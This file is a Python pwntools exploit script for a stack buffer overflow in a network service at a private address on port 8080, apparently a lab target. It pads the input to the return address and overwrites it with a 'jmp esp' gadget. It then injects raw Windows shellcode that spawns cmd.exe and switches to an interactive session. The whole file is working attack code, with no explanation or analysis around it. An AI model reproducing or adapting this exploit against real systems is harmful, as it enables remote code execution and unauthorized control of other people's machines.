from pwn import *
import time


target_ip = "192.168.128.2"
target_port = 8080


offset = 28               # Offset to return address
jmp_esp = p32(0x401453)   # Address of "jmp esp" instruction in little-endian format

# Windows shellcode that creates a CMD.exe process using CreateProcessA
buf = (
    b"\x31\xd2\x31\xc9\x51\x68\x65\x78\x65\x00\x68\x63\x6d\x64\x2e\x89\xe3\x83\xec\x54"
    b"\x89\xe7\x51\x58\xb9\x15\x00\x00\x00\xf3\xab\x83\xef\x54\xc6\x07\x44\x8d\x77\x44"
    b"\x56\x57\x51\x51\x6a\x00\x6a\x01\x51\x51\x53\x51\xb8\x6b\x23\x80\x7c\xff\xd0"
    b"\x6a\x00\xb8\x0a\xd2\x81\x7c\xff\xd0"
)


payload = b"A" * offset                # Padding to reach return addr
payload += jmp_esp                     # Ovverwrite the return addr
payload += buf                         # Inject Shellcode


# Display payload details
print("\n[+] Payload Details")
print(f"    Target: {target_ip}:{target_port}")
print(f"    Offset to return address: {offset}")
print(f"    JMP ESP address: {hex(u32(jmp_esp))}")
print(f"    Payload size: {len(payload)} bytes")
print(f"    Shellcode size: {len(buf)} bytes\n\n")

try:
    # Connect to the target
    print(f"[+] Connecting to {target_ip}:{target_port}...")
    io = remote(target_ip, target_port)
    print("[+] Connection established successfully!")

    # Send the payload
    print("[+] Sending the payload...")
    io.send(payload)
    time.sleep(1)  # Give the server time to process
    print("[+] Payload sent! Waiting for the exploit to trigger...\n")

 
    # Switch to interactive mode
    io.interactive()

except Exception as e:
    print(f"[-] Error: {str(e)}")
    print("[-] Exploit failed. Check target details and payload configuration.")

finally:
    print("\n[+] Exploit script completed. Exiting.")
